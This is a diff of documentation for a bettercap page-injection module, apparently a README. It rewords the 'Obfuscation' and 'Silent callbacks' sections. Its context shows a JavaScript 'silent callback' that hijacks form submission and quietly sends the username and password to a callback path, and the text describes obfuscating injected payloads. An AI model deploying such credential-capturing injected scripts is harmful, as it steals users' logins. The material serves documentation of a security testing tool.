@@ -67,7 +67,7 @@ Once the payload is injected into a page, you can technically phish any data unl
 
 ### Obfuscation
 
-You are able to write payloads that are automatically obfuscated by the module.
+You can write custom payloads that are automatically obfuscated by the module.
 
 Basically every word that was found beginning with `obf_` will be obfuscated.
 
@@ -94,12 +94,11 @@ jfIleNwmKoa()
 
 ### Silent callbacks
 
-You can write a custom payload that communicates back to bettercap without alerting the host.
+You can write custom payloads that communicate with bettercap without alerting the host.
 
 Example of a silent callback:
 
 ```js
-// This is a custom payload
 form.onsubmit = function() {
   req = new XMLHttpRequest()
   req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
